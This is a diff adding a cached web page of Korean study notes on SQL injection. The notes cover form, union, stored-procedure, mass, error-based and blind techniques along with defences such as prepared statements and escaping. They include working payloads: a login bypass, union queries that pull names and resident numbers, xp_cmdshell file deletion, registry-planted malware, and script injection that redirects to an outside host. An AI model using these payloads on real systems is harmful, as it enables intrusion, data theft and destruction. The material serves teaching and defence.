@@ -1,0 +1,546 @@
+I"�l<h1 id="sql-injection">SQL Injection</h1>
+
+<h2 id="sql-injection-1">SQL Injection</h2>
+<ul>
+  <li>개요
+    <ul>
+      <li>코드 인젝션의 한 기법으로 클라이언트의 입력값을 조작하여 서버의 데이터베이스 공격
+        <ul>
+          <li>예) 웹페이지 로그인 폼의 ID/PW 입력란에 SQL 쿼리를 삽입</li>
+        </ul>
+      </li>
+      <li>공격이 쉬운데 비해 파괴력이 강하기 때문에 시큐어코딩의 기본중 하나</li>
+      <li>Injection 계열 취약점들은 테스트를 통한 발견은 어려우나 스캐닝툴이나 코드 검증절차를 거치면 보통 쉽게 발견되기 때문에 탐지하기 쉬운 편
+        <ul>
+          <li>스캐닝 툴
+            <ul>
+              <li>Nikto : GNU 오픈소스, 웹서버, Injection 등 취약점 점검</li>
+              <li>SQLMap (Python) : 블라인드 SQL Injection 점검</li>
+              <li>Absinthe : 블라인드 SQL Injection 점검</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>입력 값 필터링이 제대로 이루어지지 않는 경우 발생</li>
+    </ul>
+  </li>
+  <li>Web Application 의 일반적인 인증 절차
+    <ul>
+      <li>ID/PW 입력</li>
+      <li>SQL Query 생성</li>
+      <li>Database 에 쿼리 전송</li>
+      <li>Database 에서 쿼리 실행</li>
+    </ul>
+  </li>
+  <li>공격방식에 따른 분류
+    <ul>
+      <li>Form SQL Injection
+        <ul>
+          <li>구조
+            <ul>
+              <li>HTML
+                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      &lt;form&gt;
+          &lt;input /&gt;
+          &lt;submit&gt;
+      &lt;/form&gt;
+</code></pre></div>                </div>
+              </li>
+              <li>웹서버
+                <ul>
+                  <li>PHP, JSP, ASP 처리</li>
+                  <li>쿼리문 생성</li>
+                  <li>WHERE 절을 TRUE 로 만든다 (공격예시)</li>
+                </ul>
+              </li>
+              <li>DB</li>
+            </ul>
+          </li>
+          <li>주석처리문자
+            <ul>
+              <li>MySQL : # , MSSQL : –, ORACLE : –</li>
+            </ul>
+          </li>
+          <li>URL 인코딩 (<code class="language-plaintext highlighter-rouge">%xx</code> 로 표기, xx 는 16진수)
+            <ul>
+              <li><code class="language-plaintext highlighter-rouge">#</code> -&gt; %23</li>
+              <li><code class="language-plaintext highlighter-rouge">-</code> -&gt; %2D</li>
+              <li><code class="language-plaintext highlighter-rouge">'</code> -&gt; %27</li>
+              <li><code class="language-plaintext highlighter-rouge">=</code> -&gt; %3D</li>
+              <li>공백 -&gt; <code class="language-plaintext highlighter-rouge">+</code> 혹은 %20</li>
+              <li>널문자 -&gt; %00</li>
+              <li><code class="language-plaintext highlighter-rouge">;</code> -&gt; %3B</li>
+            </ul>
+          </li>
+          <li>취약점 있는지 여부 파악 방법
+            <ul>
+              <li>ID 입력 란에 <code class="language-plaintext highlighter-rouge">'</code> 나 <code class="language-plaintext highlighter-rouge">"</code> 입력 후 테스트
+                <ul>
+                  <li>Error 메시지가 출력되면 입력 값이 DB에 전달된 것 (입력검증 X) : 취약</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li>예시
+            <ul>
+              <li>PHP 코드 (로그인처리)
+                <ul>
+                  <li>취약한 코드 예시
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $query = select id, pw from member where id='$id' and pw='$pw';
+  $result = mysql_query($query, $connect);
+  $num_rows = mysql_num_rows($result);
+  if($num_rows) {
+      $row = mysql_fetch_array($result);
+      $id = $row[id];
+      echo "로그인 성공";
+  } else {
+      echo "로그인 실패";
+  }
+</code></pre></div>                    </div>
+                  </li>
+                  <li>사용자가 입력한 값을 그대로 변수에 담아옴</li>
+                  <li>변수에 <code class="language-plaintext highlighter-rouge">' or 1=1 #</code> 입력할 경우
+                    <ul>
+                      <li>ID : <code class="language-plaintext highlighter-rouge">' or 1=1 #</code></li>
+                      <li>pW : <code class="language-plaintext highlighter-rouge">test</code>
+                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select id, pw from member where id='' or 1=1#and pw='test';
+</code></pre></div>                        </div>
+                      </li>
+                    </ul>
+                  </li>
+                  <li>URI 인코딩 메시지 (HTTP 요청메시지)
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">id=' or 1=1#</code></li>
+                      <li><code class="language-plaintext highlighter-rouge">id=%27+or+1%3d1%23</code></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li>대응책
+            <ul>
+              <li>PHP 설정파일 : php.ini
+                <ul>
+                  <li><code class="language-plaintext highlighter-rouge">magic_quotes_gpc=on</code> : GET, POST, Cookie 로 전달되는 데이터에 <code class="language-plaintext highlighter-rouge">'</code>(Single quote), <code class="language-plaintext highlighter-rouge">"</code>(Double quote), <code class="language-plaintext highlighter-rouge">\</code>(Back slash), ``(Null)(0x00) 특수문자를 일반문자로 처리 (Escape 처리)</li>
+                  <li>5.4 버전 이상에서는 설정값이 없고, mysql_real_escape_string() 함수 (MySQL 라이브러리 함수) 를 이용
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $id = mysql_real_escape_string($id)
+      $pw = mysql_real_escape_string($pw)
+      $query = select id, pw from member where id='$id' and pw='$pw';
+</code></pre></div>                    </div>
+                    <ul>
+                      <li>결과 : <code class="language-plaintext highlighter-rouge">select id, pw from member where id='\' or 1=1#'</code></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li>Prepared Statement (선처리 질의문)
+                <ul>
+                  <li>동적으로 쿼리를 생성하지 않음</li>
+                  <li>사용자의 입력값을 바인딩 처리
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $stmt=$conn-&gt;prepare("select id, pw from member where id=? and pw=?");
+      $stmt-&gt;bind_param($id, $pw);
+      $stmt-&gt;execute();
+</code></pre></div>                    </div>
+                  </li>
+                  <li>입력값을 제외하고 사전 컴파일 처리</li>
+                  <li>입력값은 명령어가 아닌 입력값으로만 처리</li>
+                </ul>
+              </li>
+              <li>파라미터 필터링을 이용한 SQL Injection 방지
+                <ul>
+                  <li>블랙리스트 생성
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      function chk_blacklist($str){
+          $returnVal = false;
+          $blist = array('\'','\"','#','--','union','selector','update','or','and','insert','update')
+
+          ###for 문 체크
+              if 포함 $returnVal = true; break;
+          ###
+
+          return $returnVal;
+      }
+
+      $chk_id = chk_blacklist($id);
+      $chk_pw = chk_blacklist($pw);
+      if (chk_id || chk_pw){
+          ...
+      }
+</code></pre></div>                    </div>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Union SQL Injection
+        <ul>
+          <li>Union 명령어
+            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      select id, pw from member where id='test';
+      select id, pw from member where id='test' union select 'test', '1212'; -- 결과값이 같을 경우 하나로 표기
+      select id, pw from member where id='test' union all select 'test', '1212'; -- 결과값이 같을 경우 중복 표기
+      select id, pw from member where id='' union select 'test','1234';
+</code></pre></div>            </div>
+            <ul>
+              <li>조건 : Union 은 필드의 개수가 똑같아야 결합 가능</li>
+            </ul>
+          </li>
+          <li>컬럼을 파악할 때 사용하는 명령
+  <code class="language-plaintext highlighter-rouge">select * from member where id='' order by 4#;</code>
+            <ul>
+              <li>Error code : Unknown column ‘4’ in ‘order clause’ (필드가 3개라 판단)</li>
+            </ul>
+          </li>
+          <li>공격방식
+            <ul>
+              <li>id 부분에 <code class="language-plaintext highlighter-rouge">' union select 'test', '1234'#</code> 입력
+                <ul>
+                  <li>오류없이 인증 우회 가능</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li>예시 : 값 비교를 통한 form SQL Injection 방어 코드
+            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $query = "select id, pw from member where id=$id";
+      $result = mysql_query($query, $conn);
+      $num_rows = mysql_num_rows($result);
+      if($num_rows) {
+          $row = mysql_fetch_array($result);
+          $id = $row[id];
+          $rec_pw = $row[pw]; // 첫번째 레코드의 pw 값을 저장
+          if($pw != $rec_pw) {echo "로그인실패"} else {echo "로그인성공"}
+      }
+</code></pre></div>            </div>
+            <ul>
+              <li>Union SQL Injection 에 취약
+                <ul>
+                  <li>id : <code class="language-plaintext highlighter-rouge">' union' select 'test', 'test' #</code></li>
+                  <li>pw : <code class="language-plaintext highlighter-rouge">test</code></li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Stored Procedure SQL Injection
+        <ul>
+          <li>저장 프로시저는 여러 쿼리문을 하나의 함수처럼 실행하여 사용하는 쿼리의 집합을 의미</li>
+          <li>특정 작업을 일괄 처리하기 위한 용도로 사용</li>
+          <li>명령어
+            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      exec master..xp_cmdshell 'dir c:\'
+      exec master..xp_cmdshell 'del c:\ /q/s'
+</code></pre></div>            </div>
+            <ul>
+              <li><code class="language-plaintext highlighter-rouge">exec master.dbo.xp_cmdshell '시스템명령어'</code></li>
+              <li>확장형 저장프로시저
+                <ul>
+                  <li>xp_cmdshell
+                    <ul>
+                      <li>관리자의 권한으로 임의의 명령을 수행</li>
+                    </ul>
+                  </li>
+                  <li>xp_regwrite
+                    <ul>
+                      <li>레지스트리 작성</li>
+                    </ul>
+                  </li>
+                  <li><code class="language-plaintext highlighter-rouge">exec master.dbo.xp_dirtree 'c:\'</code>
+                    <ul>
+                      <li>디렉토리 구조</li>
+                    </ul>
+                  </li>
+                  <li>공격예시
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">aaa.php?tt=1234;exec master.dbo.xp_cmdshell 'ping 192.168.10.0'</code>
+                        <ul>
+                          <li>뒤의 명령도 실행됨.</li>
+                        </ul>
+                      </li>
+                      <li><code class="language-plaintext highlighter-rouge">aaa.php?tt=1234;exec xp_regwrite 'HKEY_LOCAL_MACHINE','\software\microsoft\window...','winhelp',REG_SZ,'c:\temp\hac.exe'</code>
+                        <ul>
+                          <li>레지스트리 키 작성, 윈도우 도움말을 볼 때 악성코드 실행</li>
+                          <li><code class="language-plaintext highlighter-rouge">c:\temp\hac.exe</code> : 공격자가 심어놓은 악성코드</li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Mass SQL Injection
+        <ul>
+          <li>기존의 SQL-Injection 기법보다 확장된 개념</li>
+          <li>보안장비와 필터링 설정을 우회하는 기법 (2가지 방법)
+            <ul>
+              <li>공격쿼리의 일부분을 HEX 인코딩</li>
+              <li>전체 쿼리를 HEX 인코딩</li>
+            </ul>
+          </li>
+          <li>대량의 DB값이 변조되어 홈페이지에 치명적인 악영향</li>
+          <li>DB값 변조시 악성 스크립트를 삽입
+            <ul>
+              <li>사용자들이 변조된 사이트를 방문시 감염</li>
+              <li>BOT이 설치되어 계정 해킹이나 DDOS 공격에 이용</li>
+            </ul>
+          </li>
+          <li>대상
+            <ul>
+              <li>공격대상이 MS-SQL 을 사용</li>
+              <li>ASP 가 가동중인 IIS 웹서버</li>
+            </ul>
+          </li>
+          <li>특징
+            <ul>
+              <li>데이터베이스에 악성코드를 대량으로 삽입</li>
+              <li>자동 삽입 스크립트를 사용하여 한번에 악성코드를 대량 삽입</li>
+              <li>POST 나 HTTP Header (쿠키, 리퍼러) 를 이용한 경우 공격 로그를 찾기 어려움</li>
+              <li>악성코드 삽입 과정에서 데이터의 손실 발생</li>
+              <li><code class="language-plaintext highlighter-rouge">&lt;script src=...&gt;&lt;/script&gt;</code> 태그를 삽입, js, swf, exe 파일</li>
+              <li>HEX 코드로 인코딩 변환
+                <ul>
+                  <li>대상 코드
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      begin
+          exec ('update' + @t + ' set' + @c + " = " &lt;script&gt; document.location = "http://www.xxx.com"&lt;/script&gt;'")
+      end
+</code></pre></div>                    </div>
+                  </li>
+                  <li>FW 등의 필터링을 우회</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li>대응방법
+            <ul>
+              <li>declare 구문을 이용한 공격방식 차단
+                <ul>
+                  <li>위해 웹 소스상의 쿼리스트링 길이 제한</li>
+                  <li>소스코드 수정 (중-장기 대응방안)</li>
+                  <li>입력문자의 필터링</li>
+                  <li>DB, System 정기 백업</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>공격유형에 따른 분류
+    <ul>
+      <li>에러 기반 SQL Injection
+        <ul>
+          <li>개요
+            <ul>
+              <li>DB 쿼리 결과의 에러값을 이용하여 원하는 정보를 점진적으로 얻어나감</li>
+              <li>DB 에러가 외부로 노출되는 취약점을 이용한 공격</li>
+              <li>Error 메시지를 노출하지 않으면 사용할 수 없음</li>
+            </ul>
+          </li>
+          <li>예시
+            <ul>
+              <li>테이블명 및 필드명 획득
+                <ul>
+                  <li>having 이용
+                    <ul>
+                      <li>검색 창이 있을 시
+                        <ul>
+                          <li><code class="language-plaintext highlighter-rouge">select * from member ... </code></li>
+                        </ul>
+                      </li>
+                      <li>group by 절이 컬럼을 기준으로 그룹을 만들 때 having 은 결과를 한번 더 필터링</li>
+                      <li>` having 1=1 –`</li>
+                      <li>오류메시지 : member.idx 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’
+                        <ul>
+                          <li>member : 테이블명</li>
+                          <li>idx : 필드명</li>
+                        </ul>
+                      </li>
+                      <li><code class="language-plaintext highlighter-rouge">group by idx --</code></li>
+                      <li>오류메시지 : member.bId 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’</li>
+                      <li><code class="language-plaintext highlighter-rouge">group by idx, bid --</code> …</li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li>컬럼(필드) 타입 획득
+                <ul>
+                  <li>sum() 이용 : 숫자형인지 여부</li>
+                  <li>union 이용
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">union select sum(컬럼명) from member --</code></li>
+                      <li>오류메시지 : 숫자타입의 필드(컬럼) -&gt; 동일 개수의 식이 있어야 합니다.</li>
+                      <li>오류메시지 : VARCHAR 타입의 필드(컬럼) -&gt; sum or avarage 연산에서는 varchar 타입 데이터 형식을 인수로 사용할 수 없습니다.</li>
+                    </ul>
+                  </li>
+                  <li>필드의 개수를 알고 있을 때 필드의 타입을 획득하는 방법
+                    <ul>
+                      <li>union select 에 NULL 을 활용</li>
+                      <li><code class="language-plaintext highlighter-rouge">union select NULL,NULL,NULL,NULL from member</code></li>
+                      <li><code class="language-plaintext highlighter-rouge">union select 1,NULL,NULL,NULL from member</code>
+                        <ul>
+                          <li>에러가 없으면 첫번째 컬럼은 Int 형</li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+                  <li>필드의 개수가 파악되면 ID, PW 를 받아올 수 있음
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">union select idx, name, password, ...</code></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Blind SQL Injection
+        <ul>
+          <li>개요
+            <ul>
+              <li>쿼리의 결과가 참인지 거짓인지의 반응으로 취약점 발견</li>
+              <li>Limit 연산, substr(문자열 자르기), ASCII(아스키 코드 반환) 등 함수를 이용</li>
+              <li>정보를 수집하고 필드값이나 테이블 명을 추측하여 공격</li>
+            </ul>
+          </li>
+          <li>예시
+            <ul>
+              <li>쿼리부분 예 (PHP)
+                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $query = "select * from bbs
+      where $find like '%$search%"
+      order by idx desc";
+</code></pre></div>                </div>
+                <ul>
+                  <li>설명
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">$search</code> : 사용자가 입력한 검색어</li>
+                      <li><code class="language-plaintext highlighter-rouge">$find</code> : 제목, 내용, 작성자, 내용+제목 등</li>
+                    </ul>
+                  </li>
+                  <li>검색어에 <code class="language-plaintext highlighter-rouge">' and 1=1#</code> 입력 시
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">where $find like '%' and 1=1#%</code>
+                        <ul>
+                          <li><code class="language-plaintext highlighter-rouge">$find like '%'</code> : True</li>
+                          <li><code class="language-plaintext highlighter-rouge">1=1</code> : True</li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+                  <li>검색어에 <code class="language-plaintext highlighter-rouge">' and 1=2#</code> 입력 시
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">where $find like '%' and 1=1#%</code>
+                        <ul>
+                          <li><code class="language-plaintext highlighter-rouge">$find like '%'</code> : True</li>
+                          <li><code class="language-plaintext highlighter-rouge">1=2</code> : False</li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+                  <li>True 와 False 에 대한 결과로 BlindSQL Injection 가능여부를 판단</li>
+                </ul>
+              </li>
+              <li>스키마
+                <ul>
+                  <li>Information_schema : DB의 구조, 제약조건 등 메타 데이터를 제공</li>
+                  <li>Information_schema.tables : 모든 테이블에 대한 정보</li>
+                  <li>Information_shcema.columns : 모든 테이블의 컬럼정보</li>
+                </ul>
+              </li>
+              <li>함수
+                <ul>
+                  <li>limit : 출력 레코드의 개수를 제한하는 함수 (ex:limit pos,len)</li>
+                  <li>substr : 문자열을 추출하는 함수 (ex:substr(문자열, pos, len))
+                    <ul>
+                      <li>pos : 시작위치 / len : 문자개수
+                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select table_schema, table_name, table_type from information_schema.tables
+  where table_type = 'base table' -- 사용자가 만든 테이블
+  limit 0,1 ;
+</code></pre></div>                        </div>
+                      </li>
+                      <li>사용자가 만든 테이블을 처음부터 1개 가져오기
+                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select substr((select table_name from information_shcema.tables where table_type = 'base table' limit 0, 1), 1, 1) from dual;
+</code></pre></div>                        </div>
+                      </li>
+                      <li>사용자가 만든 테이블명을 처음부터 1개 가져와서 앞자리 확인
+                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select column_name from information_schema.columns
+  where table_name = 'employee' 
+  limit 0, 1;
+</code></pre></div>                        </div>
+                      </li>
+                      <li>테이블명이 ‘employee’ 인 컬럼명을 처음부터 1개 가져오기</li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li>활용법
+                <ul>
+                  <li>검색창에 입력
+                    <ul>
+                      <li><code class="language-plaintext highlighter-rouge">' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#</code></li>
+                    </ul>
+                  </li>
+                  <li>완성 쿼리 내용
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      select * from bbs where subhect like '%
+      ' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#%'
+</code></pre></div>                    </div>
+                    <ul>
+                      <li>검색 결과값이 나오면 참, 결과값이 없으면 거짓</li>
+                      <li>자동화된 툴을 이용해서 테이블 정보를 파악</li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li>과정
+            <ul>
+              <li>Table 정보 -&gt; 필드(Column) 정보 -&gt; Data 획득
+                <ul>
+                  <li>information_schema.tables, information_schema.columns, union select 이용</li>
+                </ul>
+              </li>
+              <li>테이블명 획득
+                <ul>
+                  <li><code class="language-plaintext highlighter-rouge">' and substr((select table_name ...),1,1)='a'#</code></li>
+                  <li><code class="language-plaintext highlighter-rouge">%27+and+substr%28%28select+table_name...</code>
+                    <ul>
+                      <li>POST 의 Message Body 영역에 URIEncoding 방식으로 변경되어 전송됨</li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li>컬럼정보 획득 (획득한 테이블 정보 employee)
+                <ul>
+                  <li><code class="language-plaintext highlighter-rouge">' and substr((select column_name from information_schema.columns where tablew_name='employee' limit 0,1),1,1)='a'#</code></li>
+                </ul>
+              </li>
+              <li>Data 획득 (획득한 컬럼정보 이용)
+                <ul>
+                  <li><code class="language-plaintext highlighter-rouge">' and 1=2 union select 'a','b','c','d','e','f','g','h','i'#</code>
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select * from bbs where subject like '%' and 1=2 union select 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'#%'
+</code></pre></div>                    </div>
+                    <ul>
+                      <li>1=2 를 통해 원 검색결과 출력을 막음</li>
+                      <li>필드개수 9개 : bbs의 필드개수와 동일하게 설정</li>
+                      <li>출력 결과를 통해 웹사이트의 필드가 어떤 컬럼과 매핑되는지 확인</li>
+                    </ul>
+                  </li>
+                  <li>출력위치 확인 후 해당 위치로 employee 테이블의 조회결과 출력</li>
+                  <li><code class="language-plaintext highlighter-rouge">' and 1=2 union select null,null,null,concat(name, '/', juminNo), null, null, null, null, null from employee#</code>
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select * from bbs where subject like '%' and 1=2 union select null, null, null, concat(name, '/', juminNo), null, null, null, null, null from employee#%'
+</code></pre></div>                    </div>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+:ET
